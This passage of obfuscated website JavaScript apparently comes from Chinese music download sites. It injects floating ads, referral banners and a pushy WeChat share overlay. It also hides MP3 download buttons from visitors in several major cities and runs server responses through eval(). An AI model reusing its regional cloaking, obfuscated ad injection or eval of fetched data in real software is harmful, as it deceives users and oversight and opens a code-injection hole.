        return "ipad";
      }
    }
  }
  function _0x2da1c2(_0x2355de, _0x2c0b94, _0x457eba) {
    _0x457eba = _0x457eba || 0;
    var _0x401e8c = "";
    if (_0x457eba != 0) {
      var _0xdda60e = new Date();
      _0xdda60e.setTime(_0xdda60e.getTime() + _0x457eba * 1000);
      _0x401e8c = "; expires=" + _0xdda60e.toGMTString();
    }
    document.cookie = _0x2355de + "=" + escape(_0x2c0b94) + _0x401e8c + "; path=/";
  }
  function _0x352275(_0x3c079b) {
    var _0x31e5c0 = document.cookie.split(";");
    for (var _0x4ca9c8 = 0; _0x4ca9c8 < _0x31e5c0.length; _0x4ca9c8++) {
      var _0x5a74ac = _0x31e5c0[_0x4ca9c8].indexOf("=");
      var _0x4f730b = _0x31e5c0[_0x4ca9c8].substring(0, _0x5a74ac);
      _0x4f730b = _0x4f730b.replace(/\s/g, "");
      if (_0x4f730b == _0x3c079b) {
        var _0x4d65d7 = _0x31e5c0[_0x4ca9c8].substring(_0x5a74ac + 1);
        _0x4d65d7 = decodeURIComponent(_0x4d65d7);
        return _0x4d65d7;
      }
    }
    return null;
  }
}
function showAas(_0x2bda18) {
  const _0x39eee2 = document.createElement("style");
  _0x39eee2.textContent = "\n        .aas-float {\n          position: fixed;\n          z-index: 9999;\n          background: #fff;\n          color: #333;\n          box-shadow: 0 2px 8px rgba(0,0,0,0.3);\n          border-radius: 8px;\n          display: flex;\n          align-items: center;\n          cursor: pointer;\n          animation: floatUp 0.5s ease;\n          overflow: hidden;\n          left: 50%;\n          transform: translateX(-50%);\n          bottom: 20px;\n          min-width: 260px;\n          max-width: 90%;\n        }\n        .aas-float .aas-text {\n          flex: 1;\n          padding: 8px 10px;\n          font-size: 14px;\n          white-space: nowrap;\n          overflow: hidden;\n          text-overflow: ellipsis;\n        }\n        .aas-float .aas-btn {\n          background: #f92900;\n          color: #fff;\n          padding: 6px 12px;\n          font-size: 12px;\n          border-radius: 4px;\n          margin-right: 8px;\n          animation: pulse 1.5s infinite;\n        }\n        @keyframes floatUp {\n          from { transform: translate(-50%, 20px); opacity: 0; }\n          to { transform: translate(-50%, 0); opacity: 1; }\n        }\n        @keyframes pulse {\n          0% { box-shadow: 0 0 0 0 rgba(249, 41, 0, 0.6); }\n          70% { box-shadow: 0 0 0 10px rgba(249, 41, 0, 0); }\n          100% { box-shadow: 0 0 0 0 rgba(249, 41, 0, 0); }\n        }\n      ";
  document.head.appendChild(_0x39eee2);
  const _0x460cec = document.createElement("div");
  _0x460cec.className = "aas-float";
  _0x460cec.innerHTML = "\n        <div class=\"aas-text\" id=\"aasText\">" + _0x2bda18[0].text + "</div>\n        <div class=\"aas-btn\">立即体验</div>\n      ";
  document.body.appendChild(_0x460cec);
  let _0x3883b9 = 0;
  const _0x1d5750 = _0x460cec.querySelector("#aasText");
  function _0x5a5249(_0x5d73b5) {
    _0x1d5750.textContent = _0x2bda18[_0x5d73b5].text;
    _0x460cec.onclick = () => window.open(_0x2bda18[_0x5d73b5].url, "_blank");
  }
  _0x5a5249(_0x3883b9);
  setInterval(() => {
    _0x3883b9 = (_0x3883b9 + 1) % _0x2bda18.length;
    _0x5a5249(_0x3883b9);
  }, 4000);
}
function shareWechat() {
  var _0x5fddd2 = "<style>\n           /* 自定义颜色变量 */\n        :root {\n            --wechat-green: #07C160;\n            --accent-orange: #FF7D00;\n            --text-dark: #333333;\n            --text-medium: #666666;\n            --text-light: #999999;\n            --bg-light: #f5f5f5;\n            --bg-overlay: rgba(0, 0, 0, 0.7);\n        }\n        /* 动画效果 */\n        @keyframes arrowBounce {\n            0%, 100% { transform: translateX(0); }\n            50% { transform: translateX(8px); }\n        }\n        \n        @keyframes pulse {\n            0%, 100% { opacity: 1; }\n            50% { opacity: 0.8; }\n        }\n        \n        @keyframes float {\n            0%, 100% { transform: translateY(0); }\n            50% { transform: translateY(-10px); }\n        }\n        \n        @keyframes fadeIn {\n            from { opacity: 0; }\n            to { opacity: 1; }\n        }\n        \n        @keyframes scaleIn {\n            from { transform: scale(0.95); opacity: 0; }\n            to { transform: scale(1); opacity: 1; }\n        }\n        \n        /* 分享提示浮层样式 */\n        .aa123-share-modal {\n            position: fixed;\n            inset: 0;\n            background-color: var(--bg-overlay);\n            z-index: 50;\n            display: none;\n            align-items: center;\n            justify-content: center;\n            padding: 1rem;\n            animation: fadeIn 0.3s ease-out forwards;\n        }\n        \n        .aa123-share-modal.active {\n            display: flex;\n        }\n        \n        .aa123-share-arrow {\n            position: absolute;\n            top: 1.5rem;\n            right: 1.5rem;\n            width: 50%;\n        }\n        \n        .aa123-share-arrow-icon {\n            color: white;\n            font-size: 1.5rem;\n            animation: arrowBounce 1.5s infinite;\n        }\n        \n        .aa123-share-arrow-text {\n            background-color: rgba(255, 255, 255, 0.9);\n            backdrop-filter: blur(4px);\n            color: var(--text-dark);\n            padding: 0.5rem 0.75rem;\n            border-radius: 0.5rem;\n            margin-top: 0.5rem;\n            display: inline-block;\n            float: right;\n            animation: pulse 2s ease-in-out infinite;\n            font-size: 0.875rem;\n            font-weight: 500;\n        }\n        \n        .aa123-share-modal-content {\n            background-color: white;\n            border-radius: 1rem;\n            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);\n            max-width: 28rem;\n            width: 100%;\n            padding: 1.5rem;\n            z-index: 10;\n            transform: scale(0.95);\n            opacity: 0;\n            animation: scaleIn 0.3s ease-out forwards 0.1s;\n        }\n        \n        .aa123-share-modal-header {\n            text-align: center;\n            margin-bottom: 1.25rem;\n        }\n        \n        .aa123-share-icon-container {\n            display: inline-flex;\n            align-items: center;\n            justify-content: center;\n            width: 4rem;\n            height: 4rem;\n            border-radius: 50%;\n            background-color: rgba(7, 193, 96, 0.1);\n            color: var(--wechat-green);\n            margin-bottom: 1rem;\n        }\n        \n        .aa123-share-icon {\n            font-size: 1.5rem;\n        }\n        \n        .aa123-share-title {\n            font-size: 1.25rem;\n            font-weight: bold;\n            color: var(--text-dark);\n            margin-bottom: 0.5rem;\n        }\n        \n        .aa123-share-subtitle {\n            color: var(--text-medium);\n            font-size: 0.875rem;\n        }\n        \n        .aa123-accent-text {\n            color: var(--accent-orange);\n            font-weight: 600;\n        }\n        \n        .aa123-share-message {\n            background-color: var(--bg-light);\n            border-radius: 0.5rem;\n            padding: 1rem;\n            margin-bottom: 1.5rem;\n        }\n        \n        .aa123-message-icon {\n            color: var(--accent-orange);\n            margin-right: 0.75rem;\n            margin-top: 0.25rem;\n        }\n        \n        .aa123-message-title {\n            font-size: 0.875rem;\n            font-weight: 500;\n            color: var(--text-dark);\n            text-align: left;\n        }\n        \n        .aa123-message-content {\n            font-size: 0.75rem;\n            color: var(--text-light);\n            margin-top: 0.25rem;\n            text-align: left;\n        }\n        \n        .aa123-close-button {\n            width: 100%;\n            background-color: var(--wechat-green);\n            color: white;\n            font-weight: 500;\n            padding: 0.75rem 1rem;\n            border-radius: 0.5rem;\n            transition: all 0.2s ease;\n            cursor: pointer;\n            animation: float 3s ease-in-out infinite;\n            border: none;\n        }\n        \n        .aa123-close-button:hover {\n            background-color: rgba(7, 193, 96, 0.9);\n            transform: scale(1.02);\n        }\n        \n        .aa123-close-button:active {\n            transform: scale(0.98);\n        }\n        \n        .aa123-page-title {\n            font-size: 1.5rem;\n            font-weight: bold;\n            color: var(--text-dark);\n            margin-bottom: 1rem;\n        }\n        \n        .aa123-page-subtitle {\n            color: var(--text-medium);\n            max-width: 20rem;\n            margin-bottom: 2rem;\n        }\n    </style>\n    <!-- 分享提示浮层 (默认隐藏) -->\n    <div id=\"aa123-share-modal\" class=\"aa123-share-modal\">\n        <!-- 右上角箭头指示 -->\n        <div class=\"aa123-share-arrow\">\n            <div style=\"display: flex; justify-content: flex-end;\">\n                <div class=\"aa123-share-arrow-icon\">\n                    <svg viewBox=\"0 0 24 24\" width=\"24\" height=\"24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                        <path d=\"M12 19V5M5 12l7-7 7 7\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n                    </svg>\n                </div>\n            </div>\n            <div class=\"aa123-share-arrow-text\">\n                <p>点击右上角 <svg viewBox=\"0 0 24 24\" width=\"12\" height=\"12\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\" class=\"ml-1 inline-block\">\n                    <circle cx=\"5\" cy=\"12\" r=\"2\" fill=\"currentColor\"/>\n                    <circle cx=\"12\" cy=\"12\" r=\"2\" fill=\"currentColor\"/>\n                    <circle cx=\"19\" cy=\"12\" r=\"2\" fill=\"currentColor\"/>\n                </svg></p>\n            </div>\n        </div>\n        \n        <!-- 浮层主体内容 -->\n        <div class=\"aa123-share-modal-content\">\n            <div class=\"aa123-share-modal-header\">\n                <div class=\"aa123-share-icon-container\">\n                    <div class=\"aa123-share-icon\">\n                        <svg t=\"1752740271173\" class=\"icon\" viewBox=\"0 0 1024 1024\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" p-id=\"6998\" width=\"24\" height=\"24\"><path d=\"M819.226977 659.43304C757.33302 659.43304 704.164682 694.409159 676.681057 745.296498L315.975759 562.422359C324.981478 542.214729 330.219749 519.971606 330.219749 496.421706 330.219749 471.397634 324.105457 447.973836 314.007223 426.795329L690.652752 271.575558C720.409572 309.839265 766.36664 334.891235 818.592 334.891235 908.4115 334.891235 981.226149 262.07882 981.226149 172.257089 981.226149 82.43759 908.410385 9.622944 818.592 9.622944 728.77027 9.622944 655.957857 82.43759 655.957857 172.257089 655.957857 180.697023 657.201027 188.804401 658.441961 196.897274L258.632648 361.660652C232.649975 344.073273 201.323016 333.787559 167.585604 333.787559 77.763872 333.787559 4.951458 406.603321 4.951458 496.421705 4.951458 586.243436 77.763874 659.055849 167.585604 659.055849 203.650889 659.055849 236.656237 646.933282 263.626526 627.0649L657.042563 826.520946C659.457479 914.230181 730.931866 984.701332 819.228092 984.701332 909.047592 984.701332 981.862241 911.888919 981.862241 822.067189 981.861126 732.248804 909.046477 659.43304 819.226977 659.43304L819.226977 659.43304Z\" fill=\"#22b678\" p-id=\"6999\"></path></svg>\n                    </div>\n                </div>\n                <h3 class=\"aa123-share-title\">来个分享呗！好运要组队生效~~每天限1次！</h3>\n                <p class=\"aa123-share-subtitle\">\n                    把这个页面转发给朋友或群聊，今日幸运值自动翻倍！<span class=\"aa123-accent-text\">好运常伴</span>\n                </p>\n            </div>\n            \n            <div class=\"aa123-share-message\">\n                <div style=\"display: flex;\">\n                    <div class=\"aa123-message-icon\">\n                        <svg t=\"1752740380250\" class=\"icon\" viewBox=\"0 0 1024 1024\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" p-id=\"11958\" width=\"16\" height=\"16\"><path d=\"M1022.906 511.011c0 108.813-43.686 212.872-124.792 285.51-4.275 3.835-9.617 5.718-14.951 5.718-6.151 0-12.278-2.521-16.7-7.46-8.257-9.215-7.485-23.4 1.736-31.657 71.63-64.144 109.872-156.034 109.872-252.11 0-94.219-36.922-184.884-106.254-248.747-9.093-8.391-9.68-22.577-1.289-31.683 8.391-9.093 22.564-9.693 31.67-1.302C980.714 301.623 1022.906 404.303 1022.906 511.011L1022.906 511.011zM824.111 511.023c0 68.63-30.4 133.017-83.403 176.665-4.161 3.452-9.214 5.118-14.237 5.118-6.458 0-12.877-2.789-17.312-8.174-7.868-9.546-6.503-23.674 3.063-31.549 42.614-35.103 67.061-86.874 67.061-142.059 0-53.386-23.158-104.078-63.544-139.086-9.349-8.098-10.357-22.258-2.246-31.606 8.111-9.368 22.251-10.363 31.619-2.259C795.319 381.592 824.111 444.639 824.111 511.023L824.111 511.023zM582.256 830.571 252.434 681.754 252.434 334.837l329.821-149.181L582.255 830.571 582.256 830.571zM65.291 664.333 65.291 375.218c0-12.36 10.05-22.405 22.417-22.405l107.588 0 0 333.931L87.709 686.744C75.342 686.744 65.291 676.693 65.291 664.333L65.291 664.333zM627.224 116.311c-6.337-4.141-14.326-4.831-21.237-1.819l-392.938 177.08L71.296 291.572c-37.075 0-69.3 30.158-69.3 67.233l0 319.886c0 37.075 32.225 67.246 69.3 67.246l142.04 0 393.155 165.37c2.725 1.104 5.584 1.646 8.436 1.646 4.397 0 8.768-1.295 12.52-3.835 6.19-4.161 9.897-11.123 9.897-18.582L637.344 135.053C637.345 127.504 633.535 120.459 627.224 116.311L627.224 116.311zM627.224 116.311\" fill=\"#FF7D00\" p-id=\"11959\"></path></svg>\n                    </div>\n                    <div>\n                        <p class=\"aa123-message-title\">每日一言</p>\n                        <p class=\"aa123-message-content\" id=\"aa123-message-content\">你今天咬牙扛过的难，都会变成未来某天照亮前路的光 —— 那些看似走不通的路，其实都是在为你铺垫更开阔的风景。</p>\n                    </div>\n                </div>\n            </div>\n            \n            <button id=\"aa123-close-modal\" class=\"aa123-close-button\">\n                知道了，去分享\n            </button>\n        </div>\n    </div>";
  const _0x201efe = document.createElement("div");
  _0x201efe.innerHTML = _0x5fddd2;
  document.body.appendChild(_0x201efe);
  const _0x161af1 = document.createElement("script");
  _0x161af1.type = "text/javascript";
  _0x161af1.textContent = "\n        const quotes = [\n          \"你今天咬牙扛过的难，都会变成未来某天照亮前路的光 —— 那些看似走不通的路，其实都是在为你铺垫更开阔的风景。\",\n          \"不必急着让别人认可，你默默扎根的每一步，时光都看在眼里。当你足够茂盛时，自然会吸引清风和阳光。\",\n          \"生活从不会辜负认真生活的人，就像种子不会辜负土壤 —— 你埋下的每一份努力，终会以意想不到的方式回馈。\",\n          \"别害怕起点低，怕的是不肯迈步。哪怕每天只往前走一小步，日积月累，也能走出别人不曾抵达的远方。\",\n          \"那些让你辗转难眠的压力，其实是在提醒你：你正在靠近想要的生活，再撑一撑就好。\",\n          \"真正的强大不是从不跌倒，而是摔进泥里时，还能攥着梦想爬起来，拍掉灰尘说 “再来一次”。\",\n          \"别总羡慕别人的光芒，你或许不知道，他们也曾在黑暗里独自熬过无数个夜晚。你的坚持，也会让你成为别人眼中的光。\",\n          \"所有值得的东西，都需要踮起脚尖去够。别怕暂时的辛苦，当你握住结果的那一刻，会感谢当初没放弃的自己。\",\n          \"生活就像一面镜子，你对它笑，它就还你温暖；你对它用力，它就给你回响。\",\n          \"不必焦虑时光，你走的每一步都有意义。就像春天播种的人，夏天除草，秋天自然会收获属于自己的果实。\",\n          \"那些看似 “没用” 的坚持，其实是在积累勇气。当机会来临时，你会发现自己早已准备好。\",\n          \"别总盯着自己的不足，你身上一定有别人羡慕的特质。接纳自己的不完美，才能带着底气往前走。\",\n          \"哪怕眼下一团乱麻也没关系，先做好眼前能做的小事。就像拼拼图，拼对一块，剩下的就会越来越清晰。\",\n          \"真正的成长，不是突然变得厉害，而是在无数个 “不想坚持” 的瞬间，选择了再试一次。\",\n          \"生活不会一直难，就像黑夜再长也会迎来黎明。你要做的，就是在黑暗里保持前行的勇气。\",\n          \"别和别人比速度，每个人的花期不同。有人年少成名，有人大器晚成，重要的是你一直在朝着花期努力。\",\n          \"你今天愿意为梦想多吃一点苦，明天就会为自己多添一份甜。所有的付出，都有回甘。\",\n          \"别因为暂时没看到结果就放弃，很多事情就差最后一步。就像挖井，再往下一凿，可能就会涌出清泉。\",\n          \"能定义你的只有你自己，过去的失败不算数，未来的你永远有机会成为想成为的人。\",\n          \"感谢那个不曾放弃的自己吧 —— 是每一次咬牙坚持，让你变成了今天更强大的模样。未来的你，也会感谢现在努力的自己。\",\n          \"我的人生没有失败，因为我要么成功，要么成长。我的人生也没有敌人，全是老师，所以我不是得到就是学到。我的人生也没有白走的路，对了我就庆祝，错了我就进步！\"\n        ];\n        \n        function getRandomQuote() {\n          const idx = Math.floor(Math.random() * quotes.length);\n          return quotes[idx];\n        }\n        \n        document.getElementById('aa123-message-content').innerHTML = getRandomQuote()\n        \n        // 检测是否在微信浏览器中\n        function isWechatBrowser() {\n         const userAgent = navigator.userAgent.toLowerCase();\n            return userAgent.includes('micromessenger');\n            // return true;\n        }\n        \n        // 检查是否在24小时内已经显示过提示\n        function shouldShowPrompt() {\n            const lastShown = localStorage.getItem('wechatSharePrompt');\n            if (!lastShown) return true;\n\n            const now = new Date().getTime();\n            const twentyFourHours = 24 * 60 * 60 * 1000; // 24小时的毫秒数\n\n            return (now - parseInt(lastShown)) > twentyFourHours;\n        }\n        \n        // 记录提示显示时间\n        function recordPromptShown() {\n            localStorage.setItem('wechatSharePrompt', new Date().getTime().toString());\n        }\n        \n        // 显示分享提示浮层\n        function showShareModal() {\n            const modal = document.getElementById('aa123-share-modal');\n            modal.classList.add('active');\n        }\n        \n        // 隐藏分享提示浮层\n        function hideShareModal() {\n            const modal = document.getElementById('aa123-share-modal');\n            modal.classList.remove('active');\n            recordPromptShown();\n\n            // 清理定时器\n            if (shareTimer) {\n                clearTimeout(shareTimer);\n                shareTimer = null;\n            }\n        }\n        \n        // 用户交互状态跟踪\n        let shareTimer = null;\n\n        // 检查用户是否已经交互过（当前会话）\n        function hasUserInteracted() {\n            const sessionInteraction = sessionStorage.getItem('userInteracted');\n            return sessionInteraction === 'true';\n        }\n\n        // 记录用户已交互（仅在当前会话有效）\n        function recordUserInteraction() {\n            sessionStorage.setItem('userInteracted', 'true');\n        }\n\n        // 标记用户已交互并启动定时器\n        function markUserInteraction() {\n            console.log('12334',hasUserInteracted())\n            if (!hasUserInteracted()) {\n                recordUserInteraction();\n\n                // 检查是否应该显示分享提示\n                if (isWechatBrowser() && shouldShowPrompt()) {\n                    showShareModal();\n                }\n            }\n        }\n\n        // 页面加载完成后初始化\n        const closeButton = document.getElementById('aa123-close-modal');\n\n        // 检查用户是否已经在当前会话中交互过\n        if (hasUserInteracted()) {\n            // 如果已经交互过，直接启动定时器\n            if (isWechatBrowser() && shouldShowPrompt()) {\n                shareTimer = setTimeout(() => {\n                    showShareModal();\n                }, 10000); // 10秒 = 10000毫秒\n            }\n        } else {\n            console.log('123')\n            // 如果还没有交互过，监听用户交互事件\n            const interactionEvents = ['click', 'touchstart'];\n\n            interactionEvents.forEach(eventType => {\n                document.addEventListener(eventType, markUserInteraction, { once: true, passive: true });\n            });\n        }\n        console.log(111111)\n        // 关闭按钮事件 - 点击后记录时间，24小时内不再弹出\n        closeButton.addEventListener('click', hideShareModal);\n\n        // 页面卸载时清理定时器\n        window.addEventListener('beforeunload', () => {\n            if (shareTimer) {\n                clearTimeout(shareTimer);\n                shareTimer = null;\n            }\n        });\n    ";
  document.body.appendChild(_0x161af1);
}
const hostList = ["zz123.com", "m.9ku.com", "www.dudu123.com", "www.diwuai.com"];
(hostList.indexOf(document.domain) > -1 || _country.indexOf("广州") != -1 || _country.indexOf("重庆") != -1 || _country.indexOf("深圳") != -1) && shareWechat();
(function () {
  var _0x2fd58f = document.createElement("script");
  var _0x3e79bc = window.location.protocol.split(":")[0];
  _0x3e79bc === "https" ? _0x2fd58f.src = "https://zz.bdstatic.com/linksubmit/push.js" : _0x2fd58f.src = "http://push.zhanzhang.baidu.com/push.js";
  var _0x4b71bf = document.getElementsByTagName("script")[0];
  _0x4b71bf.parentNode.insertBefore(_0x2fd58f, _0x4b71bf);
})();
var invite_code = "";
var bottom = "0";
if (document.domain == "www.xzmp3.com") {
  invite_code = "D19F36KU8";
} else {
  if (document.domain == "m.9ku.com") {
    invite_code = "RVSACBKPX";
  } else {
    if (!(document.domain == "m.airuan8.com")) {
      if (document.domain == "www.8lrc.com") {
        invite_code = "7X19Y6LKA";
      } else {
        if (!(document.domain == "www.aishici8.com")) {
          document.domain == "zz123.com" && (invite_code = "LCGYANW78", bottom = "130px");
        }
      }
    }
  }
}
invite_code != "" && ismobile;
function fuceng() {
  var _0x517a02 = "<a href=\"https://dj400.com/discover?invite_code=" + invite_code + "\" target=\"_blank\" style=\"display: block;width: 100%;position: fixed;left: 0;bottom: " + bottom + ";z-index:9999;\"><img style=\"display: block;width: 80%;margin:0 auto;\" src=\"https:/cdn.jsbaidu.com/aaimg/djagif20231109.gif\" /></a>";
  var _0x53a46b = document.createElement("div");
  _0x53a46b.innerHTML = _0x517a02;
  var _0x49c8ce = document.getElementsByTagName("body")[0];
  _0x49c8ce.appendChild(_0x53a46b);
}
if (document.domain == "www.xzmp3.com") {
  try {
    $(function () {
      _country.indexOf("北京") != -1 || _country.indexOf("上海") != -1 || _country.indexOf("广州") != -1 || _country.indexOf("深圳") != -1 ? $(".download").remove() : ($(".download").show(), $("#qrcode").html("<img src=\"/static/images/img.jpg\">"), $("#btn_pass").click(function () {
        var _0x9a068c = $("#pass").val().trim();
        _0x9a068c == "" ? _showToast("请输入验证码") : $.get("/ajax/?act=getmp3&pass=" + _0x9a068c, function (_0x2f089b) {
          var _0x19957f = eval("(" + _0x2f089b + ")");
          _0x19957f.data == "0" ? _showToast("验证码错误或过期，请重新获取") : ($("#showpass").hide(), $("#showmp3link,#showmp3").css("display", "block"));
        });
      }));
    });
  } catch {}
}
if (document.domain == "zz123.com") {
  try {
    $(function () {
      _country.indexOf("北京") != -1 || _country.indexOf("上海") != -1 || _country.indexOf("广州") != -1 || _country.indexOf("深圳") != -1 ? $(".download_mp3_bopx").remove() : $("#btn_pass").off("click").on("click", function () {
        var _0x6cc7f8 = $("#pass").val().trim();
        _0x6cc7f8 == "" ? toast("请输入验证码") : $.get("/ajax/?act=getmp3&pass=" + _0x6cc7f8, function (_0x3df2fb) {
          var _0x6fb2a9 = eval("(" + _0x3df2fb + ")");
          _0x6fb2a9.data == "0" ? toast("验证码错误或过期，请重新获取") : ($("#showpass").hide(), $("#showmp3").css("display", "block"));
        });
      });
    });
  } catch {}
}